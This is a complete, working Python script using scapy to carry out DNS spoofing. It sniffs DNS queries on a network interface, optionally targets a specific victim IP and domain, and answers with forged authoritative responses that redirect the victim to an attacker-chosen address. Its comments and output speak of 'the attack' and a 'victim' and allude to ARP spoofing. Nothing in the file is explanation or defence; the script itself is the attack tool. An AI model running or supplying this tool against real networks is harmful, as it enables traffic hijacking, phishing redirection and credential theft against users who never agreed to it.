#!/usr/bin/env python

import argparse, os, sys, threading
# Get rid of scapy warning
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from time import sleep

def arg_parser():
	parser = argparse.ArgumentParser()
	parser.add_argument("-d", dest="domain",    help="Domain to spoof (default: all)")
	parser.add_argument("-i", dest="interface", help="Interface to listen on (default: default)")
	parser.add_argument("-t", dest="target",    help="Target's IP. If not specified (default: all)")
	parser.add_argument("-r", dest="ip",    help="IP to redirect the target to (default: local IP)")
	return parser.parse_args()

def is_not_root():
	return (os.geteuid() != 0)

def forge_packet(pkt, ip):
	RR_TTL = 60
	forged_DNSRR = DNSRR(rrname=pkt[DNS].qd.qname, ttl=RR_TTL, rdlen=4, rdata=ip)
	forged_pkt =  IP(src=pkt[IP].dst, dst=pkt[IP].src) /\
	             UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport) /\
	             DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, an=forged_DNSRR)
	return forged_pkt

def packet_handler(pkt, domain, target, ip):
	# Check whether it's a DNS query
	if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
		# Check whether the domain is correct
		if domain is None or domain == pkt[DNS].qd.qname.decode('UTF-8'):
			# Check whether the query comes from the victim
			if target is None or pkt[IP].src == target:
				forged_pkt = forge_packet(pkt, ip)
				print("[*] Forged DNS response sent! Told '%s' that '%s' was at '%s'." % (pkt[IP].src, pkt[DNS].qd.qname.decode('UTF-8'), ip))
				send(forged_pkt, verbose=0)

def DNS_spoof(interface, domain, target, ip, stop_event):
	while not stop_event.is_set():
		sniff(iface=interface, prn=lambda pkt: packet_handler(pkt, domain, target, ip), store=0, count=1)

def main():
	# Parse the arguments
	args = arg_parser()
	interface = args.interface
	if interface is None:
		interface = scapy.all.conf.iface
	target = args.target
	domain = args.domain
	if domain is not None and domain[-1] != '.':
		domain = domain+'.'
	ip = args.ip
	# If no IP has been set, use the local one
	if ip is None:
		ip = [x[4] for x in scapy.all.conf.route.routes if (x[2] != "0.0.0.0" and x[3] == interface)][0]
	
	# Check whether we're root
	if (is_not_root()):
		sys.exit("Please, run this script with superuser privileges.")
	
	# Creating the DNS spoofing thread
	stop_event = threading.Event()
	dns=threading.Thread(target=DNS_spoof, args=(interface, domain, target, ip, stop_event))
	dns.start()

	# Wait for the user to end the attack
	try:
		while True:
			sleep(0.1)
	except KeyboardInterrupt:
		# Stop the threads (ARP and DNS spoofing)
		stop_event.set()

	# Leave
	dns.join()
	print("Exiting!")

if __name__ == "__main__":
    main()
